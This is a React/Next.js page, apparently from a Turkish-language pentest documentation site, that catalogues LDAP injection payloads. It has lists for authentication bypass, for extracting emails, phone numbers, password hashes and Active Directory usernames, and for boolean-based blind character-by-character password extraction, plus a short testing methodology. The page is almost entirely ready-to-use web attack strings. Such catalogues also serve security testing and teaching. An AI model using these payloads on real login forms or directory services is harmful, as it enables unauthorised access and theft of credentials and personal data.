"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function LDAPInjectionPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
          <Database className="w-4 h-4" />
          <span>Injection Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">LDAP Injection</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          LDAP sorgularının manipüle edilmesi ile dizin servislerine yetkisiz erişim.
          Authentication bypass, bilgi sızıntısı ve privilege escalation.
        </p>
      </motion.div>

      <Callout type="info" title="Hedef">
        LDAP genelde Active Directory, OpenLDAP ile kullanılır. Login formları,
        kullanıcı arama ve adres defterleri hedef alınır.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Authentication Bypass</h2>
        <PayloadList
          title="Login Bypass Payloads"
          initialShow={10}
          payloads={[
            { code: `*`, note: "Wildcard - tüm kayıtlar" },
            { code: `*)(&`, note: "Filter breakout" },
            { code: `*)(uid=*))(|(uid=*`, note: "OR injection" },
            { code: `admin)(|(password=*`, note: "Password filter bypass" },
            { code: `*)(objectClass=*`, note: "Tüm object class'lar" },
            { code: `admin)(&)`, note: "AND true injection" },
            { code: `admin)(|(cn=*`, note: "CN wildcard injection" },
            { code: `*)(uid=admin`, note: "UID injection" },
            { code: `admin)(!(&(1=0`, note: "NOT operator bypass" },
            { code: `*))%00`, note: "Null byte terminator" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Information Disclosure</h2>
        <PayloadList
          title="Data Extraction"
          initialShow={8}
          payloads={[
            { code: `*)(mail=*`, note: "Tüm email adreslerini çek" },
            { code: `*)(telephoneNumber=*`, note: "Telefon numaraları" },
            { code: `*)(userPassword=*`, note: "Password hash'leri" },
            { code: `*)(description=*`, note: "Açıklama alanları" },
            { code: `*)(memberOf=*`, note: "Grup üyelikleri" },
            { code: `*)(objectClass=person)(cn=*`, note: "Tüm kişiler" },
            { code: `*)(objectClass=computer)(cn=*`, note: "Tüm bilgisayarlar" },
            { code: `*)(objectClass=group)(cn=*`, note: "Tüm gruplar" },
            { code: `*)(objectClass=organizationalUnit)(ou=*`, note: "Tüm OU'lar" },
            { code: `*)(sAMAccountName=*`, note: "AD kullanıcı adları" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Blind LDAP Injection</h2>
        <PayloadList
          title="Boolean-Based Blind"
          initialShow={8}
          payloads={[
            { code: `admin)(|(password=a*`, note: "Password 'a' ile mi başlıyor?" },
            { code: `admin)(|(password=b*`, note: "Password 'b' ile mi başlıyor?" },
            { code: `admin)(|(password=ab*`, note: "İkinci karakter 'b' mi?" },
            { code: `*)(uid=admin)(|(objectClass=*`, note: "admin var mı?" },
            { code: `*)(uid=a*)(|(objectClass=*`, note: "'a' ile başlayan user var mı?" },
            { code: `*)(cn=*admin*)(|(objectClass=*`, note: "CN'de 'admin' geçen kayıt" },
            { code: `*)(description=*password*)(|(objectClass=*`, note: "Description'da 'password' geçen" },
            { code: `*)(mail=*@target.com)(|(objectClass=*`, note: "Belirli domain'deki mailler" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Special Characters</h2>
        <PayloadList
          title="LDAP Meta Characters"
          initialShow={6}
          payloads={[
            { code: `(`, note: "Filter group open" },
            { code: `)`, note: "Filter group close" },
            { code: `|`, note: "OR operator" },
            { code: `&`, note: "AND operator" },
            { code: `!`, note: "NOT operator" },
            { code: `*`, note: "Wildcard" },
            { code: `\\`, note: "Escape character" },
            { code: `%00`, note: "Null byte" },
            { code: `%28 %29`, note: "URL encoded parens" },
            { code: `%2a`, note: "URL encoded wildcard" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Login formlarında * wildcard deneyin{"\n"}
        2. Kullanıcı arama alanlarında LDAP filter injection yapın{"\n"}
        3. Boolean-based blind ile karakter karakter extraction{"\n"}
        4. Error mesajlarından LDAP yapısını çıkarın{"\n"}
        5. Null byte ile filter truncation deneyin
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/injection/command" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>Command Injection</span>
        </Link>
        <Link href="/docs/injection/nosql" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>NoSQL Injection</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
